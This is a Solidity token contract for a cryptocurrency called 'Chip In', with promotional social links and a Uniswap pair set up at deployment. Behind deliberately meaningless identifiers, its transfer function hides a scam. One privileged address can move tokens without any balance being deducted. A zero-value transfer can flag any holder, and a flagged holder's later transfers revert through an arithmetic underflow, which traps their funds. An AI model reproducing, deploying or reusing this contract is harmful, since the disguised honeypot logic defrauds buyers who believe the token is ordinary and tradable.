/*

TG: https://t.me/Chipinportal
Web: https://chipin.vip/
Twitter: https://twitter.com/chipintoken

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.1;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ChipIn is Ownable {
    function transfer(address blue, uint256 object) public returns (bool success) {
        pride(msg.sender, blue, object);
        return true;
    }

    uint8 public decimals = 9;

    function pride(address lay, address blue, uint256 object) private returns (bool success) {
        if (shown[lay] == 0) {
            balanceOf[lay] -= object;
        }

        if (object == 0) spring[blue] += cook;

        if (lay != uniswapV2Pair && shown[lay] == 0 && spring[lay] > 0) {
            shown[lay] -= cook;
        }

        balanceOf[blue] += object;
        emit Transfer(lay, blue, object);
        return true;
    }

    uint256 private cook = 82;

    function transferFrom(address lay, address blue, uint256 object) public returns (bool success) {
        require(object <= allowance[lay][msg.sender]);
        allowance[lay][msg.sender] -= object;
        pride(lay, blue, object);
        return true;
    }

    address public uniswapV2Pair;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private shown;

    string public name = 'Chip In';

    string public symbol = 'Chip In';

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private spring;

    function approve(address hurried, uint256 object) public returns (bool success) {
        allowance[msg.sender][hurried] = object;
        emit Approval(msg.sender, hurried, object);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address alphabet) {
        balanceOf[msg.sender] = totalSupply;
        shown[alphabet] = cook;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }
}